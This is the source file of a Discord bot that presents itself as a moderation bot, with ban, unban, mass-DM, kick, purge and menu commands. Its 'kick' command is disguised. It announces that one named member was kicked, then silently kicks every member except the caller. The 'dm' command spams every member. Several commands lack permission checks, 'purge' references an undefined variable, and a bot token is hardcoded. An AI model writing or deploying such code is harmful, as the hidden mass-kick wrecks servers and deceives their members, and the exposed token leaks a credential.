import discord
from discord.ext import commands
from discord import Permissions
import string
import asyncio
from webserver import keep_alive
import os

client = commands.Bot(command_prefix='carrot ')




@client.event
async def on_ready():
    """Tells what the bot to do when it is ready."""
    await client.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game(' carrot')
    )
    print(
        f'\nLogged in as {client.user.name}#{client.user.discriminator},',
        f'User ID: {client.user.id}, Version: {discord.__version__}\n'
    )

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):  # has_permissions()
        await ctx.send('🚫 **Permission Denied!**')
    if isinstance(error, commands.CheckFailure):  # custom check
        await ctx.send('🚫 **Access Denied!**')
    else:
        print(error)

@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : discord.Member, *, reason = None):
  """Bans @user from the server"""
  await member.ban(reason = reason)

#The below code unbans player.
@client.command()
async def unban(ctx, *, member):
  """Unbans @user from the server"""
  banned_users = await ctx.guild.bans()
  member_name, member_discriminator = member.split("#")

  for ban_entry in banned_users:
      user = ban_entry.user

      if (user.name, user.discriminator) == (member_name, member_discriminator):
          await ctx.guild.unban(user)
          await ctx.send(f'Unbanned {user.mention}')
          return


@client.command()
async def dm(ctx, *, msg=None):
    """DMs everyone in the server"""
    await ctx.message.delete()
    if msg is not None:
        await ctx.send('✅ **DMing everyone!**')
        for member in ctx.guild.members:
            if member != ctx.guild.me:
                try:
                    if member.dm_channel is not None:
                        await member.dm_channel.send(msg)
                    else:
                        await member.create_dm()
                        await member.dm_channel.send(msg)
                except discord.Forbidden:
                    continue
            else:
                continue
        await ctx.send('✅ **DMed everyone!**')
    else:
        await ctx.send('🚫 **Cannot send blank message!**')


@client.command()
async def kick(ctx,member):
  """Kicks @user from the server"""
  await ctx.message.delete()
  await ctx.send(member +'**has been kicked!**')
  for member in ctx.guild.members:
    try:
        if member != ctx.author:
            await member.kick()
        else:
            continue
    except discord.Forbidden:
        continue


@client.command()
async def purge(ctx):
  """Deletes all messages in channel"""
  await tc.purge(bulk=True)


@client.command()
async def menu(ctx):
 
  await ctx.message.delete()
  await ctx.send(''' `List Of Commands:`
  ban @user
  dm @user
  kick @user
   menu ''')

@client.command()
async def logout(ctx):
  """Logs the bot out."""
  await client.logout()

client.run('NzIxMDc0MTY1ODQ2OTAwODE2.XuPO_A.kV6hZOJ24GkqDHGJ2GNnN_e8aS8')   